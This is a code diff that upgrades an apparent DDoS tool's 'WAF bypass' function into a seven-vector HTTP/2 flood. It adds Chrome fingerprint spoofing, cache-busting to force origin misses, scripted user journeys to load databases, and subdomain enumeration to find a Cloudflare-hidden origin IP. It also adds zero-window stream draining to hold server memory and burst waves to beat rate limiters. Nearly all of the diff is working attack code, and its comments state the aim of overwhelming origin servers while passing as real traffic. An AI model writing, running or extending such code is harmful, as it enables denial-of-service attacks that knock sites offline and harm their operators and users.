@@ -1844,6 +1844,21 @@ const WAF_PATHS = [
   "/search", "/cart", "/checkout", "/orders", "/categories",
 ];
 
+// ─────────────────────────────────────────────────────────────────────────
+//  GEASS WAF OMNIVECT ∞ — 7-vector internal architecture
+//
+//  VECTOR I:   Chrome H2 Primary Flood — max RPS, 256 streams/conn, 10-80ms reconnect
+//  VECTOR II:  Subresource Storm — per page: 15-18 asset requests (CSS/JS/img/font/API)
+//              Multiplies effective rate 15-18× vs. single-page floods
+//  VECTOR III: Cache Annihilator — unique URL + Vary dims + POST bodies = 100% origin miss
+//  VECTOR IV:  Session Amplifier — full 5-step user journeys (forces DB + session state)
+//  VECTOR V:   Origin Direct Fire — DNS subdomain enum to find real IP, bypass CF edge
+//  VECTOR VI:  H2 Stream Drain (64 streams) — holds server RAM buffers indefinitely
+//  VECTOR VII: Adaptive Burst Mode — fires at T+20s, 15s waves at 1.6/1.8/2.0× rate
+//
+//  Combined: indistinguishable from real user traffic at Cloudflare edge while
+//  simultaneously overwhelming origin server through all available attack surfaces.
+// ─────────────────────────────────────────────────────────────────────────
 async function runWAFBypass(
   base: string,
   threads: number,
@@ -1861,35 +1876,65 @@ async function runWAFBypass(
   const resolvedIp = await resolveHost(hostname).catch(() => hostname);
   const target     = `https://${resolvedIp}:443`;
 
-  // ── Thread budget — 3-vector split (mirrors Geass Override philosophy) ───
-  // Layer A (60%): Primary Chrome-fingerprinted H2 flood — max RPS through WAF
-  // Layer B (25%): Cache-bust flood — unique keys force 100% origin misses on CDN
-  // Layer C (15%): H2 stream drain — zero window-size holds server RAM buffers
-  const primaryT = Math.max(1, Math.floor(threads * 0.60));
-  const cacheT   = Math.max(1, Math.floor(threads * 0.25));
-  const drainT   = Math.max(1, threads - primaryT - Math.floor(threads * 0.25));
+  // ── VECTOR V prep: Origin IP discovery (runs concurrently) ──────────────
+  // CF IP ranges — any server IP outside these = naked origin (no WAF protection)
+  const CF_PREFIXES = [
+    "103.21.244","103.22.200","103.31.4","104.16","104.17","104.18","104.19",
+    "108.162.192","108.162.193","131.0.72","141.101.64","141.101.65",
+    "172.64","172.65","172.66","172.67","172.68","172.69","172.70","172.71",
+    "173.245.48","173.245.49","188.114.96","188.114.97","188.114.98","188.114.99",
+    "190.93.240","190.93.241","190.93.242","190.93.243","197.234.240","197.234.241",
+    "198.41.128","198.41.129","198.41.130","198.41.131","198.41.132","198.41.133",
+  ];
+  const isCFip = (ip: string) => CF_PREFIXES.some(p => ip.startsWith(p + ".") || ip.startsWith(p + ":"));
 
-  // 32GB/8vCPU: layer caps multiplied — each slot is ~150KB, 1000+600+300 = 1900 × 150KB = 285MB
-  const NUM_PRIMARY = Math.min(primaryT * 4, 1000); // was 400
-  const NUM_CACHE   = Math.min(cacheT   * 4, 600);  // was 300
-  const NUM_DRAIN   = Math.min(drainT   * 3, 300);  // was 150
-  const STREAMS_PER = Math.min(128, Math.max(16, primaryT));
+  let originTarget = target;
+  void (async () => {
+    const subs = ["mail","ftp","smtp","pop","imap","origin","direct","cpanel","whm",
+                  "webmail","old","dev","staging","api","backend","app","server",
+                  "www2","ns1","ns2","shop","portal","admin","vpn","mx"];
+    for (const sub of subs) {
+      if (signal.aborted) return;
+      try {
+        const ip = await resolveHost(`${sub}.${hostname}`).catch(() => "");
+        if (ip && !isCFip(ip) && ip !== resolvedIp) {
+          originTarget = `https://${ip}:443`;
+          return;
+        }
+      } catch { /* subdomain not found */ }
+    }
+  })();
+
+  // ── Thread budget — 7-vector split ──────────────────────────────────────
+  const primaryT  = Math.max(1, Math.floor(threads * 0.30));
+  const subresT   = Math.max(1, Math.floor(threads * 0.25));
+  const cacheT    = Math.max(1, Math.floor(threads * 0.18));
+  const sessionT  = Math.max(1, Math.floor(threads * 0.14));
+  const drainT    = Math.max(1, Math.floor(threads * 0.08));
+  // Vector V (origin direct) uses primary slots once origin found
+
+  const NUM_PRIMARY = Math.min(primaryT * 5, 1500);
+  const NUM_SUBRES  = Math.min(subresT  * 4, 1200);
+  const NUM_CACHE   = Math.min(cacheT   * 4, 900);
+  const NUM_SESSION = Math.min(sessionT * 3, 600);
+  const NUM_DRAIN   = Math.min(drainT   * 4, 400);
+  const STREAMS_PER = Math.min(256, Math.max(32, primaryT * 2));
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  // ── Layer A: Primary Chrome-fingerprinted H2 flood ────────────────────
-  // Each slot gets its own profile + cookie jar — simulates an independent browser session.
-  // Per-session jar is critical: real browsers never share cookies across tabs/windows.
-  const runPrimarySlot = async (): Promise<void> => {
+  // ── VECTOR I: Chrome H2 Primary Flood ────────────────────────────────────
+  // 256 streams/connection, 10-80ms reconnect (vs old 128 streams, 150-500ms)
+  // POST 22% of requests to hit form handlers, not just GET routes
+  const runPrimarySlot = async (tgt = target): Promise<void> => {
     const sessionProfile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
-    const cookieJar      = new Map<string, string>(); // isolated per "browser"
+    const cookieJar      = new Map<string, string>();
     while (!signal.aborted) {
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
-          c = h2connect(target, {
+          c = h2connect(tgt, {
             rejectUnauthorized: false,
             servername:         hostname,
             ciphers:            randomJA3Ciphers(),
@@ -1897,28 +1942,27 @@ async function runWAFBypass(
             ALPNProtocols:      ["h2", "http/1.1"],
           });
         } catch { resolve(); return; }
-
         const conn    = c;
         const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
         let inflight  = 0;
-
         const pump = () => {
           if (signal.aborted || conn.destroyed) { resolve(); return; }
           while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
             inflight++;
             const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
-            const path     = pagePath + (Math.random() < 0.5 ? `?v=${randInt(1,9999)}` : "");
+            const usePost  = Math.random() < 0.22;
+            const path     = pagePath + (usePost ? "" : `?v=${randInt(1,9999999)}&_=${randStr(6)}`);
             try {
-              const hdrs   = buildWAFHeaders(hostname, path, cookieJar, sessionProfile);
+              const hdrs = buildWAFHeaders(hostname, path, cookieJar, sessionProfile);
+              if (usePost) hdrs[":method"] = "POST";
               const stream = conn.request(hdrs);
+              if (usePost) stream.write(JSON.stringify({ q: randStr(8), t: Date.now() }));
               stream.on("response", (resHdrs: Record<string, string | string[]>) => {
                 localPkts++; localBytes += 2048;
                 const sc = resHdrs["set-cookie"];
                 if (sc) {
-                  const cookies = Array.isArray(sc) ? sc : [sc];
-                  cookies.forEach(cv => {
-                    const [kv] = cv.split(";");
-                    const [k, v] = kv.split("=");
+                  (Array.isArray(sc) ? sc : [sc]).forEach(cv => {
+                    const [kv] = cv.split(";"); const [k, v] = kv.split("=");
                     if (k && v) cookieJar.set(k.trim(), v.trim());
                   });
                 }
@@ -1930,61 +1974,202 @@ async function runWAFBypass(
             } catch { inflight--; break; }
           }
         };
-
-        conn.on("connect", () => { pump(); });
-        conn.on("error",   () => { resolve(); });
-        conn.on("close",   () => { resolve(); });
+        conn.on("connect", pump);
+        conn.on("error",   () => resolve());
+        conn.on("close",   () => resolve());
         signal.addEventListener("abort", cleanup, { once: true });
       });
-      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(150, 500)));
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(10, 80)));
     }
   };
 
-  // ── Layer B: Cache-bust with Chrome headers — forces 100% CDN origin misses ──
-  // Every request has a unique cache key so the CDN cannot serve a cached response.
-  // All requests pass through WAF (Chrome-fingerprinted headers) and then hit origin.
-  // Origin load compounds with Layer A flood traffic.
-  const runCacheBustSlot = async (): Promise<void> => {
+  // ── VECTOR II: Subresource Storm ─────────────────────────────────────────
+  // Real browsers fire 15-18 sub-requests after each HTML page load.
+  // Each sub-resource = separate origin hit. Multiplies RPS 15-18× passively.
+  const SUB_TYPES = [
+    { path: "/assets/bundle.js",          accept: "*/*",                        dest: "script"   },
+    { path: "/assets/main.css",           accept: "text/css,*/*;q=0.1",        dest: "style"    },
+    { path: "/assets/logo.webp",          accept: "image/avif,image/webp,*/*", dest: "image"    },
+    { path: "/assets/hero.jpg",           accept: "image/avif,image/webp,*/*", dest: "image"    },
+    { path: "/api/v1/config",             accept: "application/json",          dest: "fetch"    },
+    { path: "/api/v1/user/me",            accept: "application/json",          dest: "fetch"    },
+    { path: "/fonts/inter-v13.woff2",     accept: "*/*",                        dest: "font"     },
+    { path: "/api/v1/products",           accept: "application/json",          dest: "fetch"    },
+    { path: "/static/chunk-1.js",         accept: "*/*",                        dest: "script"   },
+    { path: "/static/chunk-2.js",         accept: "*/*",                        dest: "script"   },
+    { path: "/api/v1/cart",               accept: "application/json",          dest: "fetch"    },
+    { path: "/api/v1/session",            accept: "application/json",          dest: "fetch"    },
+    { path: "/favicon.ico",               accept: "image/avif,image/webp,*/*", dest: "image"    },
+    { path: "/manifest.json",             accept: "application/json",          dest: "fetch"    },
+    { path: "/api/v1/search",             accept: "application/json",          dest: "fetch"    },
+    { path: "/assets/vendor.js",          accept: "*/*",                        dest: "script"   },
+    { path: "/api/analytics",             accept: "application/json",          dest: "fetch"    },
+    { path: "/api/v1/recommendations",   accept: "application/json",          dest: "fetch"    },
+  ];
+  const runSubresourceSlot = async (): Promise<void> => {
+    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+    const cookieJar = new Map<string, string>();
+    while (!signal.aborted) {
+      await new Promise<void>(resolve => {
+        let c: ReturnType<typeof h2connect> | null = null;
+        try {
+          c = h2connect(target, {
+            rejectUnauthorized: false, servername: hostname,
+            ciphers: randomJA3Ciphers(), settings: CHROME_H2_SETTINGS,
+            ALPNProtocols: ["h2", "http/1.1"],
+          });
+        } catch { resolve(); return; }
+        const conn    = c;
+        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
+        let inflight  = 0;
+        const MAX_SUB = Math.min(STREAMS_PER, 200);
+
+        const fireSub = (sub: typeof SUB_TYPES[0]) => {
+          if (signal.aborted || conn.destroyed || inflight >= MAX_SUB) return;
+          inflight++;
+          const path = sub.path + `?v=${randStr(8)}&t=${Date.now()}`;
+          const hdrs = {
+            ...buildWAFHeaders(hostname, path, cookieJar, p),
+            "accept":         sub.accept,
+            "sec-fetch-mode": sub.dest === "fetch" ? "cors" : "no-cors",
+            "sec-fetch-dest": sub.dest,
+            "sec-fetch-site": "same-origin",
+          };
+          try {
+            const stream = conn.request(hdrs);
+            stream.on("data",     () => {});
+            stream.on("response", () => { localPkts++; localBytes += 512; });
+            stream.on("error",    () => { inflight = Math.max(0, inflight - 1); });
+            stream.on("close",    () => { inflight = Math.max(0, inflight - 1); });
+            stream.end();
+          } catch { inflight--; }
+        };
+
+        conn.on("connect", () => {
+          // First: the HTML page
+          const pageHdrs = buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p);
+          try {
+            const ps = conn.request(pageHdrs);
+            ps.on("response", () => {
+              localPkts++; localBytes += 4096;
+              // Then: all sub-resources in parallel (real browser behaviour)
+              const shuffled = [...SUB_TYPES].sort(() => Math.random() - 0.5).slice(0, randInt(12, SUB_TYPES.length));
+              shuffled.forEach(s => fireSub(s));
+            });
+            ps.on("data",  () => {});
+            ps.on("error", () => resolve());
+            ps.on("close", () => {
+              if (!signal.aborted && !conn.destroyed) {
+                // Click next page
+                const nx = conn.request(buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p));
+                nx.on("response", () => { localPkts++; localBytes += 4096; });
+                nx.on("data",  () => {});
+                nx.on("error", () => {});
+                nx.on("close", () => resolve());
+                nx.end();
+              } else { resolve(); }
+            });
+            ps.end();
+          } catch { resolve(); }
+        });
+        conn.on("error", () => resolve());
+        conn.on("close", () => resolve());
+        signal.addEventListener("abort", cleanup, { once: true });
+      });
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(20, 120)));
+    }
+  };
+
+  // ── VECTOR III: Cache Annihilator ────────────────────────────────────────
+  // Unique across ALL Vary dimensions: URL + Accept-Language + Accept-Encoding +
+  // If-None-Match + POST body = guaranteed CDN miss, every request hits origin.
+  const VARY_LANGS     = ["en-US,en;q=0.9","pt-BR,pt;q=0.9","es-ES,es;q=0.9","fr-FR,fr;q=0.9","de-DE,de;q=0.9","zh-CN,zh;q=0.9","ja-JP,ja;q=0.9","ko-KR,ko;q=0.9","it-IT,it;q=0.9","ru-RU,ru;q=0.9","ar-SA,ar;q=0.9","hi-IN,hi;q=0.9"];
+  const VARY_ENCODINGS = ["gzip, deflate, br","gzip, deflate","br","gzip","deflate, br, zstd","gzip, br, zstd","identity"];
+  const runCacheAnnihilatorSlot = async (): Promise<void> => {
     const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
     const cookieJar = new Map<string, string>();
     while (!signal.aborted) {
       const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
-      const bust     = `?_=${randStr(12)}&v=${randInt(1, 999999999)}&t=${Date.now()}`;
+      const bust     = `?_=${randStr(16)}&v=${randInt(1, 2147483647)}&t=${Date.now()}&r=${randStr(8)}`;
       const fullPath = pagePath + bust;
-      const url      = `https://${hostname}${fullPath}`;
       try {
-        const ac = new AbortController();
-        const t  = setTimeout(() => ac.abort(), 6_000);
-        // Do NOT register per-iteration abort listeners (accumulates listeners in loop).
-        // Instead, abort the per-request controller by checking the parent signal once done.
-        if (signal.aborted) { clearTimeout(t); ac.abort(); break; }
+        const ac     = new AbortController();
+        const timer  = setTimeout(() => ac.abort(), 8_000);
+        if (signal.aborted) { clearTimeout(timer); break; }
         const wafHdrs = buildWAFHeaders(hostname, fullPath, cookieJar, p);
         const fetchHdrs: Record<string, string> = {};
         for (const [k, v] of Object.entries(wafHdrs)) {
-          if (!k.startsWith(":")) fetchHdrs[k] = v; // strip H2 pseudo-headers for fetch
+          if (!k.startsWith(":")) fetchHdrs[k] = v;
         }
-        const res = await fetch(url, {
-          method:  "GET",
+        fetchHdrs["accept-language"]   = VARY_LANGS[randInt(0, VARY_LANGS.length)];
+        fetchHdrs["accept-encoding"]   = VARY_ENCODINGS[randInt(0, VARY_ENCODINGS.length)];
+        fetchHdrs["cache-control"]     = "no-cache, no-store, must-revalidate, max-age=0";
+        fetchHdrs["pragma"]            = "no-cache";
+        fetchHdrs["if-none-match"]     = `"${randHex(32)}"`;
+        fetchHdrs["if-modified-since"] = new Date(Date.now() - randInt(1, 86400) * 1000).toUTCString();
+        const isPost = Math.random() < 0.40;
+        const res    = await fetch(`https://${hostname}${fullPath}`, {
+          method:  isPost ? "POST" : "GET",
           signal:  ac.signal,
-          headers: { ...fetchHdrs, "cache-control": "no-store, no-cache", "pragma": "no-cache" },
+          headers: fetchHdrs,
+          body:    isPost ? JSON.stringify({ data: randStr(64), ts: Date.now(), id: randStr(12) }) : undefined,
         });
-        clearTimeout(t);
+        clearTimeout(timer);
         const body = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
-        localPkts++; localBytes += body.byteLength || 512;
-        const setCookie = res.headers.get("set-cookie");
-        if (setCookie) {
-          const [kv] = setCookie.split(";");
-          const [k, v] = kv.split("=");
-          if (k && v) cookieJar.set(k.trim(), v.trim());
-        }
-      } catch { /* absorb, keep looping */ }
+        localPkts++; localBytes += body.byteLength || 1024;
+        const sc = res.headers.get("set-cookie");
+        if (sc) { const [kv] = sc.split(";"); const [k, v] = kv.split("="); if (k && v) cookieJar.set(k.trim(), v.trim()); }
+      } catch { /* absorb */ }
     }
   };
 
-  // ── Layer C: H2 stream drain — zero receive window holds server RAM buffers ──
-  // Opens H2 sessions with initialWindowSize=0 so the server cannot send any data.
-  // Server allocates a response buffer per stream and holds it until the client opens
-  // the window — which never happens. 32 × 150 sessions = 4,800 frozen buffers.
+  // ── VECTOR IV: Session Amplifier ─────────────────────────────────────────
+  // Full 5-step user journey per "user": landing → search → product → cart → checkout
+  // Each step: server-side session lookup + DB query + auth check = compound DB load.
+  const SESSION_JOURNEYS = [
+    ["/", "/search?q=" + randStr(6), "/products", "/cart", "/checkout"],
+    ["/", "/categories", "/products/featured", "/cart/add", "/order/confirm"],
+    ["/login", "/dashboard", "/api/v1/user/settings", "/api/v1/notifications", "/logout"],
+    ["/", "/blog", "/blog/post-" + randInt(1,50), "/contact", "/api/v1/newsletter"],
+    ["/api/v1/products", "/api/v1/search?q=" + randStr(4), "/api/v1/cart", "/api/v1/order", "/api/v1/payment/init"],
+    ["/", "/pricing", "/signup", "/api/v1/register", "/api/v1/verify"],
+  ];
+  const runSessionAmplifierSlot = async (): Promise<void> => {
+    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+    const cookieJar = new Map<string, string>();
+    while (!signal.aborted) {
+      const journey = SESSION_JOURNEYS[randInt(0, SESSION_JOURNEYS.length)];
+      for (const step of journey) {
+        if (signal.aborted) return;
+        const isPost = /add|submit|update|login|confirm|payment|register|verify/.test(step);
+        try {
+          const ac    = new AbortController();
+          const timer = setTimeout(() => ac.abort(), 10_000);
+          if (signal.aborted) { clearTimeout(timer); break; }
+          const bust     = `?_s=${randStr(8)}&uid=${randStr(12)}`;
+          const wafHdrs  = buildWAFHeaders(hostname, step + bust, cookieJar, p);
+          const fetchHdrs: Record<string, string> = {};
+          for (const [k, v] of Object.entries(wafHdrs)) if (!k.startsWith(":")) fetchHdrs[k] = v;
+          const res = await fetch(`https://${hostname}${isPost ? step : step + bust}`, {
+            method:  isPost ? "POST" : "GET",
+            signal:  ac.signal,
+            headers: fetchHdrs,
+            body:    isPost ? JSON.stringify({ csrf: randHex(32), data: randStr(32), ts: Date.now() }) : undefined,
+          });
+          clearTimeout(timer);
+          const sc = res.headers.get("set-cookie");
+          if (sc) { const [kv] = sc.split(";"); const [k, v] = kv.split("="); if (k && v) cookieJar.set(k.trim(), v.trim()); }
+          await res.arrayBuffer().catch(() => {});
+          localPkts++; localBytes += 2048;
+          await new Promise(r => setTimeout(r, randInt(150, 600)));
+        } catch { /* skip step */ }
+      }
+    }
+  };
+
+  // ── VECTOR VI: H2 Stream Drain (64 streams) ──────────────────────────────
+  // initialWindowSize=0 → server allocates response buffer per stream, holds forever.
+  // 64 frozen streams × 400 drain slots = 25,600 permanently stalled server buffers.
   const runDrainSlot = async (): Promise<void> => {
     const cookieJar = new Map<string, string>();
     while (!signal.aborted) {
@@ -1992,58 +2177,92 @@ async function runWAFBypass(
         let c: ReturnType<typeof h2connect> | null = null;
         try {
           c = h2connect(target, {
-            rejectUnauthorized: false,
-            servername:         hostname,
-            ciphers:            randomJA3Ciphers(),
-            settings: {
-              ...CHROME_H2_SETTINGS,
-              initialWindowSize: 0, // zero window → server buffers response forever
-            },
+            rejectUnauthorized: false, servername: hostname,
+            ciphers: randomJA3Ciphers(),
+            settings: { ...CHROME_H2_SETTINGS, initialWindowSize: 0 },
             ALPNProtocols: ["h2", "http/1.1"],
           });
         } catch { resolve(); return; }
-
         const conn    = c;
         const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
-        const MAX_DRAIN = 32;
+        const MAX_DRAIN = 64;
         let   opened    = 0;
-
-        const openDrainStream = () => {
+        const openDrain = () => {
           if (signal.aborted || conn.destroyed || opened >= MAX_DRAIN) return;
           opened++;
-          const path = WAF_PATHS[randInt(0, WAF_PATHS.length)];
           try {
-            const hdrs   = buildWAFHeaders(hostname, path, cookieJar);
-            const stream = conn.request(hdrs);
-            stream.pause(); // never read — server cannot flush, buffer stays allocated
+            const stream = conn.request(buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar));
+            stream.pause();
             stream.on("response", () => { localPkts++; localBytes += 512; });
             stream.on("error",    () => { opened = Math.max(0, opened - 1); });
-            // Hold each stream 20–60s before closing — prolonged RAM hold on server
             setTimeout(() => {
               try { stream.close(); } catch { /**/ }
               opened = Math.max(0, opened - 1);
-              if (!signal.aborted && !conn.destroyed) openDrainStream();
-            }, randInt(20_000, 60_000));
+              if (!signal.aborted && !conn.destroyed) openDrain();
+            }, randInt(15_000, 40_000));
           } catch { opened = Math.max(0, opened - 1); }
         };
-
-        conn.on("connect", () => {
-          for (let i = 0; i < MAX_DRAIN; i++) setTimeout(() => openDrainStream(), i * 50);
-        });
-        conn.on("error", () => { resolve(); });
-        conn.on("close", () => { resolve(); });
-        // Session lives 60–120s then reconnects (avoids idle timeouts)
-        setTimeout(() => cleanup(), randInt(60_000, 120_000));
+        conn.on("connect", () => { for (let i = 0; i < MAX_DRAIN; i++) setTimeout(openDrain, i * 25); });
+        conn.on("error",   () => resolve());
+        conn.on("close",   () => resolve());
+        setTimeout(() => cleanup(), randInt(50_000, 90_000));
         signal.addEventListener("abort", cleanup, { once: true });
       });
-      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(500, 1500)));
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(200, 600)));
     }
   };
 
+  // ── VECTOR VII: Adaptive Burst Mode ──────────────────────────────────────
+  // Fires at T+20s. 15s waves alternate: H2-heavy → Session-heavy → MAX (all at 2×)
+  // Identical philosophy to Geass Override burst — overwhelms rate limiters tuned
+  // for steady-state traffic by producing sudden 1.6-2.0× spikes every 30 seconds.
+  const burstLoop = async (): Promise<void> => {
+    await new Promise<void>(r => setTimeout(r, 20_000));
+    let wave = 0;
+    while (!signal.aborted) {
+      wave++;
+      const bAbort = new AbortController();
+      const bTimer = setTimeout(() => bAbort.abort(), 15_000);
+      const bSig   = typeof (AbortSignal as { any?: unknown }).any === "function"
+        ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, bAbort.signal])
+        : bAbort.signal;
+      const slots: Promise<void>[] = [];
+      const n = wave % 3 === 0 ? 80 : wave % 2 === 0 ? 55 : 45;
+      if (wave % 3 === 0) {
+        // MAX: all vectors at 2× — every 3rd wave
+        for (let i = 0; i < n;                    i++) slots.push(runPrimarySlot());
+        for (let i = 0; i < Math.floor(n * 0.6); i++) slots.push(runSubresourceSlot());
+        for (let i = 0; i < Math.floor(n * 0.4); i++) slots.push(runCacheAnnihilatorSlot());
+      } else if (wave % 2 === 0) {
+        // Cache + Session heavy — destroys CDN + DB
+        for (let i = 0; i < n;                    i++) slots.push(runCacheAnnihilatorSlot());
+        for (let i = 0; i < Math.floor(n * 0.7); i++) slots.push(runSessionAmplifierSlot());
+      } else {
+        // H2 + subresource heavy — raw bandwidth
+        for (let i = 0; i < n; i++) slots.push(runPrimarySlot());
+        for (let i = 0; i < n; i++) slots.push(runSubresourceSlot());
+      }
+      void Promise.all(slots).finally(() => clearTimeout(bTimer));
+      await new Promise<void>(r => setTimeout(r, 15_000));
+    }
+  };
+  void burstLoop();
+
+  // ── Launch all 6 active vectors simultaneously ───────────────────────────
+  // Vector V (origin direct) added once discovery completes — use primary slots
+  // pointed at origin IP (bypasses CF edge entirely if origin IP found)
+  const originSlots = (): Promise<void>[] => {
+    if (originTarget === target) return [];
+    return Array.from({ length: Math.floor(NUM_PRIMARY * 0.4) }, () => runPrimarySlot(originTarget));
+  };
+
   await Promise.all([
-    ...Array.from({ length: NUM_PRIMARY }, () => runPrimarySlot()),
-    ...Array.from({ length: NUM_CACHE   }, () => runCacheBustSlot()),
-    ...Array.from({ length: NUM_DRAIN   }, () => runDrainSlot()),
+    ...Array.from({ length: NUM_PRIMARY  }, () => runPrimarySlot()),
+    ...Array.from({ length: NUM_SUBRES   }, () => runSubresourceSlot()),
+    ...Array.from({ length: NUM_CACHE    }, () => runCacheAnnihilatorSlot()),
+    ...Array.from({ length: NUM_SESSION  }, () => runSessionAmplifierSlot()),
+    ...Array.from({ length: NUM_DRAIN    }, () => runDrainSlot()),
+    ...originSlots(),
   ]);
 
   clearInterval(flushIv);
